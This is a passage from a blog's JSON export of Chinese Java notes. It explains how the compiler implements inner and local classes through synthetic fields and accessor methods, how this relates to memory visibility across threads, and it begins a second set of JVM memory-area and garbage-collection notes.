x0.a;&#125; 的方法，然后内部类调用这个方法，传递this$0这种指向外部类的引用的参数，从而获得private的数据（如果是static内部类，那么并不需要传递参数就可以获取）。可以利用这个特性，在无关的地方，使用反射来调用这个方法从而获取该类的private数据 局部类的实现原理 这是反编译字节码得到的局部类1234567891011121314151617class JavaLangTest$1LocalClass &#123; // $FF: synthetic field final InnerClass val$innerClass; // $FF: synthetic field final int val$a; JavaLangTest$1LocalClass(InnerClass var1, int var2) &#123; super(); this.val$innerClass = var1; this.val$a = var2; &#125; void worker() &#123; System.out.println(this.val$innerClass); System.out.println(this.val$a); &#125;&#125; 这是原来的代码1234567891011InnerClass innerClass = new JavaLangTest().new InnerClass();innerClass.worker();int a = 10;class LocalClass &#123; void worker() &#123; System.out.println(innerClass); System.out.println(a); &#125;&#125;LocalClass localClass = new LocalClass();localClass.worker(); 内存可见性内部类 既然我们已经知道内部类访问外部类的原理，那么内存可见性其实就和普通的类之间互相访问对方的数据没有差别。所以，如果一个变量没有final修饰或者没有volatile修饰或者没有加锁，那么就不能保证其对内部类是可见的，即使可见，也不能保证内部来看到的对象是完成构造之后的对象(这里有个问题，原子变量也是吗) 按照JCIP(java concurrent in practice)，一个对象的引用即使对于某个线程是可见的（比如某个对象发现这个引用非null了），这个对象的状态有可能还没初始化完成，也就是这个对象可能处于不一致状态 不过我在测试中，因为不能对该对象设置volatile，也不能搞个volatile的flag来标志这个对象是否已经完成初始化(因为JSR133保证，某个volatile变量被Thread a 写入后，Thread b去读这个变量，读了之后，原先在Thread a写入该变量之前对于Thread a可见的状态，对于Thread b都可见)，所以情况一直是读到该变量是null，即使另一个线程已经初始完成。所以没有复现出JCIP中提到的这种情况 局部类 因为创建线程过程中，是先构造一个Runnable对象，然后在传递给Thread，也就是构造对象的过程是在原来线程中进行的，所以可以读到这个事实final变量的正确的值 这是手写的代码 1234567891011121314class Test3 &#123; public static void main(String[] args) &#123; int a = 10; new Thread(new Runnable() &#123; @Override public void run() &#123; System.out.println(a); &#125; &#125;); new Thread(() -&gt; &#123; System.out.println(a); &#125;); &#125;&#125; 这是反编译得到的代码 1234567891011121314151617import misc.Test3.1;class Test3 &#123; Test3() &#123; super(); &#125; public static void main(String[] args) &#123; int a = 10; new Thread(new 1(a)); new Thread(new Runnable() &#123; public run() &#123; System.out.println(a); &#125; &#125;); &#125;&#125; 12345678910111213final class Test3$1 implements Runnable &#123; // $FF: synthetic field final int val$a; Test3$1(int var1) &#123; super(); this.val$a = var1; &#125; public void run() &#123; System.out.println(this.val$a); &#125;&#125; 虽然lambda反汇编出来跟匿名内部类的代码不太一样，不过我认为也是同样的在同一个线程构造Runnable对象后再传递进去（欢迎指正！）","raw":"---\ntitle: Java内部类、局部类的实现原理以及与内存可见性的关系\ndate: 2019-03-04 20:54:01\ntags:\n- java内部类\n- java局部类\ncategories:\n- JAVA\n---\n\n### 实现原理\n\n> 以下内容一部分来自于core java第十版，一部分来自于我使用openjdk java1.8/java11的javac和fernflower这个反编译器反编译字节码得到的\n> 以下内容不确实是openjdk javac特有的实现，还是规范这样要求\n\n- 对象内总有一个隐式引用， 它指向了创建它的外部类对象，比如下面的反编译代码\n   ```java\n   public class JavaLangTest {\n      public JavaLangTest() {\n         super();\n      }\n   \n      public static void main(String[] var0) {\n         JavaLangTest.InnerClass var1 = new JavaLangTest.InnerClass(new JavaLangTest());\n         System.out.println(var1);\n      }\n   }\n   ```\n   ```java\n   class JavaLangTest$InnerClass {\n      // $FF: synthetic field\n      final JavaLangTest this$0;\n   \n      private JavaLangTest$InnerClass(JavaLangTest var1) {\n         super();\n         this.this$0 = var1;\n      }\n   }\n   ```\n   其对应与以下代码\n   ```java\n   public class JavaLangTest {\n   \n       public static void main(String[] args) {\n           InnerClass innerClass = new JavaLangTest().new InnerClass();\n           System.out.println(innerClass);\n       }\n   \n       private class InnerClass {\n       }\n   }\n   ```\n\n- 内部类是一种编译器现象，与虚拟机无关。编译器将会把内部类翻译成用$(美元符号）分隔外部类名与内部类名的常规类文件，而虚拟机则对此一无所知\n\n- 内部类可以访问外围类的私有数据——无论是否static。这是一个编译器现象，那么也就是实际上这个内部类并没有魔法加持，那么它是如何访问外部类的private数据的？外部类会合成一个类似于\n\n  ```java\n  static int access$100(JavaLangTest x0) {\n      return x0.a;\n  }\n  ```\n\n  的方法，然后内部类调用这个方法，传递`this$0`这种指向外部类的引用的参数，从而获得private的数据（如果是static内部类，那么并不需要传递参数就可以获取）。可以利用这个特性，在无关的地方，使用反射来调用这个方法从而获取该类的private数据\n\n- 局部类的实现原理 \n   - 这是反编译字节码得到的局部类\n  ```java\n  class JavaLangTest$1LocalClass {\n     // $FF: synthetic field\n     final InnerClass val$innerClass;\n     // $FF: synthetic field\n     final int val$a;\n  \n     JavaLangTest$1LocalClass(InnerClass var1, int var2) {\n        super();\n        this.val$innerClass = var1;\n        this.val$a = var2;\n     }\n  \n     void worker() {\n        System.out.println(this.val$innerClass);\n        System.out.println(this.val$a);\n     }\n  }\n  ```\n  - 这是原来的代码\n  ```java\n  InnerClass innerClass = new JavaLangTest().new InnerClass();\n  innerClass.worker();\n  int a = 10;\n  class LocalClass {\n      void worker() {\n          System.out.println(innerClass);\n          System.out.println(a);\n      }\n  }\n  LocalClass localClass = new LocalClass();\n  localClass.worker();\n  ```\n\n### 内存可见性\n\n##### 内部类\n\n- 既然我们已经知道内部类访问外部类的原理，那么内存可见性其实就和普通的类之间互相访问对方的数据没有差别。所以，如果一个变量没有final修饰或者没有volatile修饰或者没有加锁，那么就不能保证其对内部类是可见的，即使可见，也不能保证内部来看到的对象是完成构造之后的对象(这里有个问题，原子变量也是吗)\n- 按照JCIP(java concurrent in practice)，一个对象的引用即使对于某个线程是可见的（比如某个对象发现这个引用非null了），这个对象的状态有可能还没初始化完成，也就是这个对象可能处于不一致状态\n- 不过我在测试中，因为不能对该对象设置volatile，也不能搞个volatile的flag来标志这个对象是否已经完成初始化(因为JSR133保证，某个volatile变量被Thread a 写入后，Thread b去读这个变量，读了之后，原先在Thread a写入该变量之前对于Thread a可见的状态，对于Thread b都可见)，所以情况一直是读到该变量是null，即使另一个线程已经初始完成。所以没有复现出JCIP中提到的这种情况\n\n##### 局部类\n\n- 因为创建线程过程中，是先构造一个Runnable对象，然后在传递给Thread，也就是构造对象的过程是在原来线程中进行的，所以可以读到这个事实final变量的正确的值\n- 这是手写的代码\n   ```java\n   class Test3 {\n       public static void main(String[] args) {\n           int a = 10;\n           new Thread(new Runnable() {\n               @Override\n               public void run() {\n                   System.out.println(a);\n               }\n           });\n           new Thread(() -> {\n               System.out.println(a);\n           });\n       }\n   }\n   ```\n- 这是反编译得到的代码\n   ```java\n   import misc.Test3.1;\n   \n   class Test3 {\n      Test3() {\n         super();\n      }\n   \n      public static void main(String[] args) {\n         int a = 10;\n         new Thread(new 1(a));\n         new Thread(new Runnable() {\n            public run() {\n               System.out.println(a);\n            }\n         });\n      }\n   }\n   ```\n   ```java\n   final class Test3$1 implements Runnable {\n      // $FF: synthetic field\n      final int val$a;\n   \n      Test3$1(int var1) {\n         super();\n         this.val$a = var1;\n      }\n   \n      public void run() {\n         System.out.println(this.val$a);\n      }\n   }\n   ```\n- 虽然lambda反汇编出来跟匿名内部类的代码不太一样，不过我认为也是同样的在同一个线程构造Runnable对象后再传递进去（欢迎指正！）\n","content":"<h3 id=\"实现原理\"><a href=\"#实现原理\" class=\"headerlink\" title=\"实现原理\"></a>实现原理</h3><blockquote>\n<p>以下内容一部分来自于core java第十版，一部分来自于我使用openjdk java1.8/java11的javac和fernflower这个反编译器反编译字节码得到的<br>以下内容不确实是openjdk javac特有的实现，还是规范这样要求</p>\n</blockquote>\n<ul>\n<li><p>对象内总有一个隐式引用， 它指向了创建它的外部类对象，比如下面的反编译代码</p>\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JavaLangTest</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">JavaLangTest</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">super</span>();</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] var0)</span> </span>&#123;</span><br><span class=\"line\">      JavaLangTest.InnerClass var1 = <span class=\"keyword\">new</span> JavaLangTest.InnerClass(<span class=\"keyword\">new</span> JavaLangTest());</span><br><span class=\"line\">      System.out.println(var1);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JavaLangTest</span>$<span class=\"title\">InnerClass</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"comment\">// $FF: synthetic field</span></span><br><span class=\"line\">   <span class=\"keyword\">final</span> JavaLangTest <span class=\"keyword\">this</span>$<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">private</span> JavaLangTest$InnerClass(JavaLangTest var1) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">super</span>();</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.<span class=\"keyword\">this</span>$<span class=\"number\">0</span> = var1;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p> 其对应与以下代码</p>\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JavaLangTest</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        InnerClass innerClass = <span class=\"keyword\">new</span> JavaLangTest().new InnerClass();</span><br><span class=\"line\">        System.out.println(innerClass);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InnerClass</span> </span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>内部类是一种编译器现象，与虚拟机无关。编译器将会把内部类翻译成用$(美元符号）分隔外部类名与内部类名的常规类文件，而虚拟机则对此一无所知</p>\n</li>\n<li><p>内部类可以访问外围类的私有数据——无论是否static。这是一个编译器现象，那么也就是实际上这个内部类并没有魔法加持，那么它是如何访问外部类的private数据的？外部类会合成一个类似于</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> access$<span class=\"number\">100</span>(JavaLangTest x0) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x0.a;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>的方法，然后内部类调用这个方法，传递<code>this$0</code>这种指向外部类的引用的参数，从而获得private的数据（如果是static内部类，那么并不需要传递参数就可以获取）。可以利用这个特性，在无关的地方，使用反射来调用这个方法从而获取该类的private数据</p>\n</li>\n<li><p>局部类的实现原理 </p>\n<ul>\n<li>这是反编译字节码得到的局部类<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JavaLangTest</span>$1<span class=\"title\">LocalClass</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"comment\">// $FF: synthetic field</span></span><br><span class=\"line\">   <span class=\"keyword\">final</span> InnerClass val$innerClass;</span><br><span class=\"line\">   <span class=\"comment\">// $FF: synthetic field</span></span><br><span class=\"line\">   <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> val$a;</span><br><span class=\"line\"></span><br><span class=\"line\">   JavaLangTest$<span class=\"number\">1L</span>ocalClass(InnerClass var1, <span class=\"keyword\">int</span> var2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">super</span>();</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.val$innerClass = var1;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.val$a = var2;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">worker</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">      System.out.println(<span class=\"keyword\">this</span>.val$innerClass);</span><br><span class=\"line\">      System.out.println(<span class=\"keyword\">this</span>.val$a);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ul>\n<li>这是原来的代码<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">InnerClass innerClass = <span class=\"keyword\">new</span> JavaLangTest().new InnerClass();</span><br><span class=\"line\">innerClass.worker();</span><br><span class=\"line\"><span class=\"keyword\">int</span> a = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LocalClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">worker</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(innerClass);</span><br><span class=\"line\">        System.out.println(a);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">LocalClass localClass = <span class=\"keyword\">new</span> LocalClass();</span><br><span class=\"line\">localClass.worker();</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"内存可见性\"><a href=\"#内存可见性\" class=\"headerlink\" title=\"内存可见性\"></a>内存可见性</h3><h5 id=\"内部类\"><a href=\"#内部类\" class=\"headerlink\" title=\"内部类\"></a>内部类</h5><ul>\n<li>既然我们已经知道内部类访问外部类的原理，那么内存可见性其实就和普通的类之间互相访问对方的数据没有差别。所以，如果一个变量没有final修饰或者没有volatile修饰或者没有加锁，那么就不能保证其对内部类是可见的，即使可见，也不能保证内部来看到的对象是完成构造之后的对象(这里有个问题，原子变量也是吗)</li>\n<li>按照JCIP(java concurrent in practice)，一个对象的引用即使对于某个线程是可见的（比如某个对象发现这个引用非null了），这个对象的状态有可能还没初始化完成，也就是这个对象可能处于不一致状态</li>\n<li>不过我在测试中，因为不能对该对象设置volatile，也不能搞个volatile的flag来标志这个对象是否已经完成初始化(因为JSR133保证，某个volatile变量被Thread a 写入后，Thread b去读这个变量，读了之后，原先在Thread a写入该变量之前对于Thread a可见的状态，对于Thread b都可见)，所以情况一直是读到该变量是null，即使另一个线程已经初始完成。所以没有复现出JCIP中提到的这种情况</li>\n</ul>\n<h5 id=\"局部类\"><a href=\"#局部类\" class=\"headerlink\" title=\"局部类\"></a>局部类</h5><ul>\n<li>因为创建线程过程中，是先构造一个Runnable对象，然后在传递给Thread，也就是构造对象的过程是在原来线程中进行的，所以可以读到这个事实final变量的正确的值</li>\n<li><p>这是手写的代码</p>\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test3</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> a = <span class=\"number\">10</span>;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Thread(<span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                System.out.println(a);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Thread(() -&gt; &#123;</span><br><span class=\"line\">            System.out.println(a);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>这是反编译得到的代码</p>\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> misc.Test3.1;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test3</span> </span>&#123;</span><br><span class=\"line\">   Test3() &#123;</span><br><span class=\"line\">      <span class=\"keyword\">super</span>();</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">int</span> a = <span class=\"number\">10</span>;</span><br><span class=\"line\">      <span class=\"keyword\">new</span> Thread(<span class=\"keyword\">new</span> <span class=\"number\">1</span>(a));</span><br><span class=\"line\">      <span class=\"keyword\">new</span> Thread(<span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">         <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            System.out.println(a);</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test3</span>$1 <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"comment\">// $FF: synthetic field</span></span><br><span class=\"line\">   <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> val$a;</span><br><span class=\"line\"></span><br><span class=\"line\">   Test3$<span class=\"number\">1</span>(<span class=\"keyword\">int</span> var1) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">super</span>();</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.val$a = var1;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">      System.out.println(<span class=\"keyword\">this</span>.val$a);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>虽然lambda反汇编出来跟匿名内部类的代码不太一样，不过我认为也是同样的在同一个线程构造Runnable对象后再传递进去（欢迎指正！）</p>\n</li>\n</ul>\n","slug":"java内部类、局部类的实现原理","categories":[{"name":"JAVA","slug":"JAVA","permalink":"https://h-zex.github.io/categories/JAVA/"}],"tags":[{"name":"java内部类","slug":"java内部类","permalink":"https://h-zex.github.io/tags/java内部类/"},{"name":"java局部类","slug":"java局部类","permalink":"https://h-zex.github.io/tags/java局部类/"}]},{"title":"My JVM Note","date":"2019-03-02T04:49:04.000Z","path":"2019/03/02/JVM-Note/","text":"本笔记大部分是《深入理解java虚拟机第二版》的笔记，该书基于java1.7 Override 准确式内存管理：即虚拟机可以知道内存中某个位置的数据具体是什么类型 运行时数据区域 方法区 线程共享 存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等 虚拟机规范把方法区描述为堆的一个逻辑部分（但是有一个别名：Non-Heap） HotSpot用永久代实现。其他虚拟机并没有永久代这个概念 但使用永久代来实现方法区，现在看来并不是一个好主意，因为这样更容易遇到内存溢出问题（永久代有-XX:MaxPermSize的上限，J9和JRockit只要没有触碰到进程可用内存的上限，例如32位系统中的4GB，就不会出现问题），而且有极少数方法（例如String.intern()）会因这个原因导致不同虚拟机下有不同的表现。 规范要求，可以不需要连续的内存（连续的的物理内存？），可以固定大小或可扩展，可以不实现垃圾收集 有OutOfMemoryError异常 运行时常量池 方法区的一部分 class文件中的常量池在类加载后就放入这里 规范没有做细节要求。一般来说,除了保存Class文件中描述的符号引用外,还会把翻译出来的直接引用也存储在运行时常量池中 具有动态性。运行期可以把新的常量放进池中（比如String.intern()） 直接内存 不是虚拟机运行时数据区的一部分，也不是规范中定义的内存区域 NIO可以直接操作堆外的内存 在JDK1.4中新加入了NIO（NewInput/Output）类，引入了一种基于通道（Channel）与缓冲区（Buffer）的I/O方式，它可以使用Native函数库直接分配堆外内存，然后通过一个存储在Java堆中的DirectByteBuffer对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在Java堆和Native堆中来回复制数据。 可能出现OOM异常 这里的内存溢出，明显的特征是HeapDum文件中不会看到明显的异常，并且可能Dump文件很小 堆 存放对象实例 垃圾收集器管理的主要区域 线程共享。虚拟机启动时创建 可以划分出多个线程私有的分配缓冲区 有OutOfMemoryError异常 规范要求，可以处于物理上不连续的内存空间，只要逻辑上连续即可。可以是可扩展或固定大小 虚拟机栈 线程私有。生命周期与线程相同 栈帧中有：局部变量表（方法运行期不会改变大小，存有基本数据类型、对象引用、returnAddress类型）、操作数栈、动态链接、方法出口等信息 方法调用对应于一个栈帧在虚拟机栈的入栈到出栈过程 有StackOverflowError异常、OutOfMemoryError异常（只有可以动态扩展虚拟机栈的虚拟机再有OOM异常） 本地方法栈 类似于虚拟机栈 线程私有、生命周期与线程相同 具体的虚拟机可以自由实现 有StackOverflowError和OutOfMemoryError异常 在HotSpot虚拟机中并不区分虚拟机栈和本地方法栈 程序计数器 线程私有、生命周期与线程相同 没有任何OutOfMemoryError情况 HotSpot在Java堆中对象的创建、布局、访问创建 以下仅限于普通对象，不包括数组和class对象 当遇到new指令时 在常量池定位这个类的符号引用，并检查该类是否已被加载、解析和初始化过。如果没有要执行对应的加载过程 为新生对象分配内存（指针碰撞、空闲列表、TLAB）（在类加载后对象所需的内存便可完全确定） 把分配到的内存空间都初始为0值（如果是TLAB，可以提前到TLAB分配时进行） 设置对象头（哪个类的实例、如何找到类的元数据信息、对象的hashCode、对象的GC分代年龄等。根据是否启用偏向锁，对象头会有不同的设置方式） 截止以上，从虚拟机的角度看，新对象已经产生了 一般来说（由字节码中是否跟随invokespecial指令所决定），执行new指令之后会接着执行&lt;init&gt; 方法， 把对象按照程序员的意愿进行初始化， 这样一个真正可用的对象才算完全产生出来 布局 对象在内存中的布局有：对象头、实例数据、对齐填充 对象头 第一部分用于存储对象自身的运行时数据，如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等 第二部分是类型指针，即指向类元数据的指针 如果是数组，还要有一块用于记录长度 实例数据 程序代码中所定义的各种类型的字段内容（包括从父类继承和子类中定义的） 存储顺序会受到虚拟机分配策略参数（FieldsAllocationStyle） 和字段在Java源码中定义顺序的影响 默认的分配策略是 相同宽度字段被分配在一起 longs/doubles ints shorts/chars bytes/booleans oops(ordinary object pointers)（有个问题，指针不是64bit吗？） 满足上面那个条件后，父类定义的出现在子类之前 如果CompactFields参数值为true（默认为true），那么子类之中较窄的变量也可能会插入到父类变量的空隙之中 padding 由于HotSpot VM的自动内存管理系统要求对象起始地址必须是8字节的整数倍，所以可能需要padding 定位和访问 HotSpot使用直接指针。另一种方式是句柄（不是HotSpot采用的） 句柄 需要在java堆中有句柄池 句柄中包含对象的实例数据和类型数据的各自具体地址 在对象被移动时，无需更新reference数据 类加载的时机 注意，这一部分JVM有明确规定，但不知道是否有一些是实现相关的。我试验时用的是HotSpot，openJDK 1.8，client模式下 按照作者说法 常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化 在实验中 1234567891011121314151617class InitTest &#123; public static void main(String[] args) &#123; System.out.println(Holder.str3); // 如果是输出str，则不会输出`Init Holder` // 如果是输出str2和str3则会 &#125; static class Holder &#123; public final static String str = \"Hello\"; public final static String str2 = new String(\"NewString\"); public final static String str3 = String.valueOf(\"Str3\"); static &#123; System.out.println(\"Init Holder\"); &#125; &#125;&#125; HotSpot VM的结构 GC（可插拔） JIT（可插拔） runtime HotSpot Runtime职责 parsing of command line arguments VM life cycle class loading, byte code interpreter exception handling synchronization thread management Java Native Interface VM fatal error handling C++ (non-Java) heap management. GC 程序计数器、虚拟机栈、本地方法栈3个区域需要的内存基本上在类结构确定时就已知（JIT优化会有所改变），并且生命周期与线程、方法的进入退出相同，所以内存回收是确定的 java堆和方法区需要的内存则需要运行时才知道，分配回收都是动态的，所以需要GC 吞吐量=运行用户代码时间/(运行用户代码时间+垃圾收集时间) GC的3件事 哪些内存需要回收？ 什么时候回收？ 如何回收？ 可作为CG Roots的对象 虚拟机栈（栈帧中的本地变量表） 中引用的对象 方法区中类静态属性引用的对象 方法区中常量引用的对象 本地方法栈中JNI（即一般说的Native方法） 引用的对象 强、软、弱、虚引用 强引用：只要还存在，GC永远不会回收被引用对象 软引用：对于软引用关联着的对象，在系统将要发生内存溢出异常之前，将会把这些对象列进回收范围之中进行第二次回收。如果这次回收还没有足够的内存，才会抛出内存溢出异常 弱引用：被弱引用关联的对象只能生存到下一次垃圾收集发生之前。当垃圾收集器工作时，无论当前内存是否足够，都会回收掉只被弱引用关联的对象 虚引用：也称为幽灵引用或者幻影引用，它是最弱的一种引用关系。一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例。为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知 Hotspot GC Minor GC：新生代的GC，Eden空间的存活对象和from survivor空间的不够老的存活对象复制到to survivor空间，from survivor空间中足够老的对象提升为老年代。结束后，Eden空间一般是全空的（也有不空的情况）。只要追求速度，空间利用率会低一些 Major GC（Full GC）：老年代GC, Major GC经常会伴随至少一次的Minor GC（但非绝对的， 在Parallel Scavenge收集器的收集策略里就有直接进行Major GC的策略选择过程） 。 Major GC的速度一般会比Minor GC慢10倍以上 java performance 